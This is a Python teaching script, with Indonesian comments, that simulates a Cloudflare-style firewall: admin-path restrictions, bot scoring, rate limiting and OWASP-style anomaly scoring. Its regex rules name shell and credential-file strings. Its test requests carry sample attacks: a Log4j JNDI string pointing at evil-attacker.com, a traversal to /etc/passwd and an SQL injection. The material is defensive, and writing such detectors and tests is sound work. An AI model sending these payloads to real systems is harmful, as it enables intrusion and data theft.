#!/usr/bin/env python3
"""
Cloudflare WAF & Ruleset Engine Simulator (CLI Diagnostic Tool)
Author: DevOps & Cloud SRE Curriculum Team
Standard: GEMINI.md Enterprise Architecture

Skrip ini mereplikasi secara deterministik algoritma evaluasi Cloudflare Ruleset Engine v2:
1. Phase 1: Custom WAF Expression Rules (Wirefilter Boolean logic & String Transformation).
2. Phase 2: Bot Intelligence Evaluation (Score, Verified Bots).
3. Phase 3: Advanced Sliding-Window Rate Limiting Simulator.
4. Phase 4: OWASP Core Ruleset (CRS) Anomaly Scoring Engine (Paranoia Level 1-4 & Threshold calculation).
"""

import re
import sys
import time
import json
import urllib.parse
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple

# ==============================================================================
# DATA MODELS
# ==============================================================================

@dataclass
class HTTPRequest:
    method: str
    uri_path: str
    headers: Dict[str, str]
    body: str
    ip_src: str
    threat_score: int = 0
    bot_score: int = 99
    is_verified_bot: bool = False

@dataclass
class OWASPRule:
    rule_id: str
    description: str
    paranoia_level: int
    score_contribution: int
    pattern: str  # Regex pattern to match

@dataclass
class EvaluationResult:
    allowed: bool
    status_code: int
    phase_terminated: Optional[str] = None
    action_taken: str = "allow"
    triggered_rules: List[str] = field(default_factory=list)
    accumulated_anomaly_score: int = 0
    details: Dict[str, any] = field(default_factory=dict)

# ==============================================================================
# RULE ENGINES & COMPONENTS
# ==============================================================================

class RateLimiter:
    """Sliding-window In-Memory Rate Limiter Simulator"""
    def __init__(self, limit: int, window_seconds: int, mitigation_timeout: int):
        self.limit = limit
        self.window_seconds = window_seconds
        self.mitigation_timeout = mitigation_timeout
        self.requests_history: Dict[str, List[float]] = {}
        self.jailed_keys: Dict[str, float] = {}

    def is_rate_limited(self, tracking_key: str) -> Tuple[bool, int]:
        current_time = time.time()

        # Check if key is currently jailed
        if tracking_key in self.jailed_keys:
            release_time = self.jailed_keys[tracking_key]
            if current_time < release_time:
                return True, int(release_time - current_time)
            else:
                del self.jailed_keys[tracking_key]
                self.requests_history[tracking_key] = []

        # Cleanup sliding window
        timestamps = self.requests_history.get(tracking_key, [])
        valid_timestamps = [t for t in timestamps if current_time - t <= self.window_seconds]
        valid_timestamps.append(current_time)
        self.requests_history[tracking_key] = valid_timestamps

        if len(valid_timestamps) > self.limit:
            # Trigger mitigation lock
            self.jailed_keys[tracking_key] = current_time + self.mitigation_timeout
            return True, self.mitigation_timeout

        return False, 0


class CloudflareWAFSimulator:
    def __init__(self, paranoia_level: int = 2, anomaly_threshold: int = 25):
        self.paranoia_level = paranoia_level
        self.anomaly_threshold = anomaly_threshold
        self.rate_limiter = RateLimiter(limit=5, window_seconds=10, mitigation_timeout=30)
        self._init_owasp_ruleset()

    def _init_owasp_ruleset(self):
        """Menginisialisasi signature subset OWASP CRS berbasis skor anomali"""
        self.owasp_rules: List[OWASPRule] = [
            # PL 1: Baseline Injection & Attack Patterns
            OWASPRule("942100", "SQLi: Basic SQL keywords and characters", 1, 10,
                      r"(?i)(\b(select|union|insert|update|delete|drop|alter)\b.*?\b(from|into|table|database)\b)|(--|/\*|\*/)"),
            OWASPRule("932100", "RCE: Remote Command Execution Strings", 1, 15,
                      r"(?i)(/bin/(bash|sh|zsh)|cmd\.exe|powershell\.exe|\b(whoami|cat\s+/etc/passwd|id)\b)"),
            OWASPRule("941100", "XSS: Basic HTML Tag & Script Injections", 1, 10,
                      r"(?i)(<script[^>]*>.*?</script>|javascript:|onerror\s*=|onload\s*=)"),
            
            # PL 2: Obfuscation, Ambiguous Encoded Payload, Directory Traversal
            OWASPRule("930110", "LFI: Directory Traversal Path Manipulation", 2, 10,
                      r"(?i)(\.\./|\.\.\\|%2e%2e%2f|%2e%2e\/)"),
            OWASPRule("944100", "JAVA: Remote Class/Log4j Injection (JNDI)", 2, 20,
                      r"(?i)(\$\{jndi:(ldap[s]?|rmi|dns)://)"),

            # PL 3: Non-ASCII characters, strict input formatting, complex evasion
            OWASPRule("920270", "HTTP Protocol: Restricted special character usage", 3, 5,
                      r"[\x00-\x08\x0B\x0C\x0E-\x1F]"),
            OWASPRule("942200", "SQLi: Advanced Blind/Tautology functions", 3, 10,
                      r"(?i)(\b(sleep|benchmark|waitfor\s+delay)\b|\bbenchmark\b\s*\()"),

            # PL 4: Extreme Character Restrictions (Whitelisting approach)
            OWASPRule("942400", "SQLi: Strict symbol & punctuation check", 4, 10,
                      r"[=';#]")
        ]

    def _transform_url_decode_lower(self, text: str) -> str:
        """Emulasi fungsi url_decode() dan lower()"""
        try:
            decoded = urllib.parse.unquote(text)
        except Exception:
            decoded = text
        return decoded.lower()

    def evaluate(self, request: HTTPRequest) -> EvaluationResult:
        result = EvaluationResult(allowed=True, status_code=200)

        # ----------------------------------------------------------------------
        # PHASE 1: CUSTOM RULES (http_request_firewall_custom)
        # ----------------------------------------------------------------------
        normalized_path = self._transform_url_decode_lower(request.uri_path)

        # Custom Rule 1: Isolation on Admin endpoint
        if normalized_path.startswith("/admin") or normalized_path.startswith("/ops/"):
            corporate_ip_subnet = "198.51.100."
            if not request.ip_src.startswith(corporate_ip_subnet):
                result.allowed = False
                result.status_code = 403
                result.phase_terminated = "http_request_firewall_custom"
                result.action_taken = "block"
                result.triggered_rules.append("CR_001_ADMIN_RESTRICTION")
                result.details["reason"] = f"Akses ke {request.uri_path} ditolak di luar jaringan VPN/CIDR internal."
                return result

        # Custom Rule 2: Enforce Request Payload Limit
        content_length = int(request.headers.get("Content-Length", 0))
        if normalized_path.startswith("/api/v1/auth") and content_length > (128 * 1024):
            result.allowed = False
            result.status_code = 413
            result.phase_terminated = "http_request_firewall_custom"
            result.action_taken = "block"
            result.triggered_rules.append("CR_002_PAYLOAD_TOO_LARGE")
            result.details["reason"] = "Payload melebihi batas buffer 128KB."
            return result

        # ----------------------------------------------------------------------
        # PHASE 2: BOT PROTECTION & RATE LIMITING (http_ratelimit)
        # ----------------------------------------------------------------------
        # Bot Score Engine Check
        if request.bot_score < 20 and not request.is_verified_bot:
            result.allowed = False
            result.status_code = 403
            result.phase_terminated = "http_bot_protection"
            result.action_taken = "managed_challenge"
            result.triggered_rules.append("BOT_SCORE_MALICIOUS")
            result.details["reason"] = f"Bot score terdeteksi berbahaya: {request.bot_score} (Bypass = False)"
            return result

        # Rate Limiting Engine Check (Target: /api/v1/auth/login)
        if normalized_path == "/api/v1/auth/login" and request.method == "POST":
            tracking_key = f"{request.ip_src}:{request.headers.get('User-Agent', 'unknown')}"
            limited, retry_after = self.rate_limiter.is_rate_limited(tracking_key)
            if limited:
                result.allowed = False
                result.status_code = 429
                result.phase_terminated = "http_ratelimit"
                result.action_taken = "rate_limit_block"
                result.triggered_rules.append("RL_AUTH_EXCEEDED")
                result.details["reason"] = f"Rate limit terlampaui. IP terisolasi selama {retry_after} detik."
                result.details["retry_after"] = retry_after
                return result

        # ----------------------------------------------------------------------
        # PHASE 3: OWASP MANAGED RULESET (http_request_firewall_managed)
        # ----------------------------------------------------------------------
        accumulated_score = 0
        inspected_targets = [
            request.uri_path,
            urllib.parse.unquote(request.uri_path),
            request.body,
            urllib.parse.unquote(request.body)
        ]
        # Include headers values in inspection
        for h_val in request.headers.values():
            inspected_targets.append(h_val)

        for rule in self.owasp_rules:
            # Abaikan rules yang berada di atas level paranoia yang aktif
            if rule.paranoia_level > self.paranoia_level:
                continue

            for target in inspected_targets:
                if re.search(rule.pattern, target):
                    accumulated_score += rule.score_contribution
                    result.triggered_rules.append(f"OWASP_{rule.rule_id} (PL{rule.paranoia_level})")
                    break  # Break inner loop to avoid double scoring same rule on same request

        result.accumulated_anomaly_score = accumulated_score
        result.details["total_anomaly_score"] = accumulated_score
        result.details["anomaly_threshold"] = self.anomaly_threshold

        if accumulated_score >= self.anomaly_threshold:
            result.allowed = False
            result.status_code = 403
            result.phase_terminated = "http_request_firewall_managed"
            result.action_taken = "owasp_anomaly_block"
            result.details["reason"] = (
                f"Skor anomali OWASP ({accumulated_score}) melampaui batas toleransi ({self.anomaly_threshold}) "
                f"pada Paranoia Level {self.paranoia_level}."
            )
            return result

        return result

# ==============================================================================
# CLI EXECUTION HARNESS & TESTS
# ==============================================================================

def print_separator():
    print("-" * 80)

def main():
    print("=" * 80)
    print(" Cloudflare Ruleset Engine & OWASP CRS Edge Simulator")
    print(" DevOps, Cloud, & SRE Technical Curriculum - Standard GEMINI.md")
    print("=" * 80)

    # Initialize Engine: Paranoia Level 2, Anomaly Threshold 25
    waf = CloudflareWAFSimulator(paranoia_level=2, anomaly_threshold=25)

    test_cases = [
        HTTPRequest(
            method="GET",
            uri_path="/products/item?id=1024",
            headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
            body="",
            ip_src="103.21.244.10",
            threat_score=0,
            bot_score=95
        ),
        HTTPRequest(
            method="GET",
            uri_path="/admin/dashboard",
            headers={"User-Agent": "Mozilla/5.0"},
            body="",
            ip_src="203.0.113.15", # Public outside IP
            threat_score=10,
            bot_score=80
        ),
        HTTPRequest(
            method="POST",
            uri_path="/api/v1/auth/login",
            headers={"User-Agent": "Mozilla/5.0", "Content-Length": "200000"},
            body='{"user": "admin"}',
            ip_src="198.51.100.22",
            threat_score=0,
            bot_score=85
        ),
        HTTPRequest(
            method="POST",
            uri_path="/api/v1/feedback",
            headers={"User-Agent": "Mozilla/5.0", "X-Forwarded-For": "8.8.8.8"},
            body='comment=hello; SELECT * FROM users WHERE 1=1 --',
            ip_src="185.220.101.5",
            threat_score=20,
            bot_score=40
        ),
        HTTPRequest(
            method="POST",
            uri_path="/search",
            headers={"User-Agent": "${jndi:ldap://evil-attacker.com/exploit}", "Content-Type": "application/json"},
            body='{"query": "shoes"}',
            ip_src="45.155.205.233",
            threat_score=50,
            bot_score=15
        ),
        HTTPRequest(
            method="GET",
            uri_path="/catalog/download?file=../../../../etc/passwd",
            headers={"User-Agent": "python-requests/2.28"},
            body="",
            ip_src="194.26.29.112",
            threat_score=15,
            bot_score=10
        )
    ]

    for idx, req in enumerate(test_cases, 1):
        print_separator()
        print(f"[*] RUNNING TEST CASE #{idx}: {req.method} {req.uri_path}")
        print(f"    Source IP: {req.ip_src} | Bot Score: {req.bot_score}")
        
        start_time = time.perf_counter()
        eval_res = waf.evaluate(req)
        latency_ms = (time.perf_counter() - start_time) * 1000

        print(f"    Verdict       : {'[ PASSED / ALLOW ]' if eval_res.allowed else '[ INTERCEPTED / MITIGATED ]'}")
        print(f"    HTTP Status   : {eval_res.status_code}")
        print(f"    Action Taken  : {eval_res.action_taken.upper()}")
        print(f"    Terminated At : {eval_res.phase_terminated}")
        print(f"    Rules Hit     : {eval_res.triggered_rules if eval_res.triggered_rules else 'None'}")
        print(f"    Anomaly Score : {eval_res.accumulated_anomaly_score}")
        print(f"    Details       : {eval_res.details.get('reason', 'Request passed all inspections.')}")
        print(f"    Edge Latency  : {latency_ms:.3f} ms")

    print_separator()
    print("[*] TESTING RATE LIMITING SIMULATION (Triggering 6 rapid requests to /api/v1/auth/login)")
    burst_request = HTTPRequest(
        method="POST",
        uri_path="/api/v1/auth/login",
        headers={"User-Agent": "BruteForceTool/1.0", "Content-Length": "35"},
        body='{"user":"admin","pass":"pass123"}',
        ip_src="198.51.100.50",
        threat_score=0,
        bot_score=75
    )

    for i in range(1, 7):
        res = waf.evaluate(burst_request)
        status = "PASSED" if res.allowed else f"BLOCKED ({res.status_code} - {res.details.get('reason')})"
        print(f"    Hit #{i}: {status}")

    print("=" * 80)
    print(" Simulation Completed.")
    print("=" * 80)

if __name__ == "__main__":
    main()
---